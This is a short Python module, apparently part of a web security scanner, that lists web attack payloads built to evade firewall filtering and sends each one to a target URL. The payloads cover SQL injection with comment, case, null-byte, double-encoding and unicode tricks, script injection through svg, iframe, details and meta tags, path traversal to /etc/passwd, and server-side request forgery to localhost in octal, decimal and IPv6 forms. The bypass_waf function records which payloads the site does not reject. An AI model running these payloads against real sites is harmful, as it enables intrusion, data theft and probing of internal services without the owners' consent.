from ..core.client import fetch
from urllib.parse import quote

PAYLOADS = [
    ("SQLi: comment", "/?id=1'/**/OR/**/1=1--"),
    ("SQLi: case", "/?id=1'/**/oR/**/1=1--"),
    ("SQLi: null byte", "/?id=1%00' OR 1=1--"),
    ("SQLi: double encode", "/?id=%25%32%37%20%4f%52%20%31%3d%31--"),
    ("SQLi: unicode", "/?id=%ef%bc%87%ef%bd%8f%ef%bd%92%ef%bc%911=1--"),
    ("XSS: svg", "/?q=<svg/onload=alert(1)>"),
    ("XSS: iframe", "/?q=<iframe onload=alert(1)>"),
    ("XSS: details", "/?q=<details open ontoggle=alert(1)>"),
    ("XSS: meta", "/?q=<meta http-equiv=refresh content='0;javascript:alert(1)'>"),
    ("LFI: ..;/", "/?page=..;/etc/passwd"),
    ("LFI: ..%252f", "/?page=..%252f..%252f..%252fetc/passwd"),
    ("SSRF: octal IP", "/?url=http://0177.0.0.1/"),
    ("SSRF: decimal IP", "/?url=http://2130706433/"),
    ("SSRF: IPv6", "/?url=http://[::1]/"),
    ("SSRF: short IPv6", "/?url=http://[0:0:0:0:0:ffff:127.0.0.1]/"),
    ("Protocol: http://0", "/?url=http://0/"),
]


def bypass_waf(url):
    base = url.rstrip("/")
    results = {}
    for name, path in PAYLOADS:
        u = f"{base}{path}"
        s, h, b = fetch(u, timeout=8)
        if s and s < 400:
            results[name] = s
    return results
